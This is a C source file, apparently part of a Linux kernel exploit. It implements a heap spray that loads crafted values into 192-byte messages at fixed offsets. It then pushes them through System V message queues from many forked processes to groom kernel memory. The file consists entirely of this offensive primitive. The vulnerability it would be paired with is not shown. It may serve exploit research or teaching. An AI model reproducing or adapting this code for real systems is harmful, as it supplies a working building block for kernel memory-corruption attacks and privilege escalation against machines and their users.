#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define SPRAY_BUF_SIZE 191
char spray_buffer[192];
void spray_buffer_init(){
    *(unsigned long*)(spray_buffer + 0x78)=0xfacea100;
    *(unsigned long*)(spray_buffer + 0xb8)=0x1;
}

#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <errno.h>
#define SPRAY_PROCESS 16
#define STRUCT_LEN 192

#define NUM_MSG 16
/* heap spray */

struct msgbuf
{
	long mtype;
	char mtext[STRUCT_LEN];
};

struct msgbuf msg={0x4141414141414141,{0}};
int msqid;

int msgsnd_spray()
{
	int i;
	unsigned long int *ptr;
	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1)
	{
		perror("msgget");
		exit(1);
	}
	memcpy(msg.mtext, spray_buffer, STRUCT_LEN-1);
	for( i = 0; i < NUM_MSG; i++)
	{
		if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1)
		{
			perror("msgsnd");
			exit(1);
		}
	}
}

int msgrcv_spray()
{
	struct msgbuf msg_rcv;
	int i;
	for(i = 0; i < NUM_MSG; i++)
	{
		if (msgrcv(msqid, (void *) &msg_rcv, sizeof(msg_rcv.mtext), 0,
					MSG_NOERROR | IPC_NOWAIT) == -1)
		{
			if(errno != ENOMSG)
			{
				perror("msgrcv");
				exit(EXIT_FAILURE);
			}
		}
		else
		{
			//printf("message received: %s\n", msg.mtext);
		}
	}
	return 0;
}

void do_fork_msgsnd_spray()
{
	int i;
	pid_t pid;

	msgsnd_spray();
	for(i = 0;i<SPRAY_PROCESS;i++)
	{
		pid = fork();
		if (pid == -1)
		{
			perror("fork");
			exit(0);
		}
		if (pid == 0)
		{
			msgsnd_spray();
			pause();
			//exit(0);
		}
	}
}
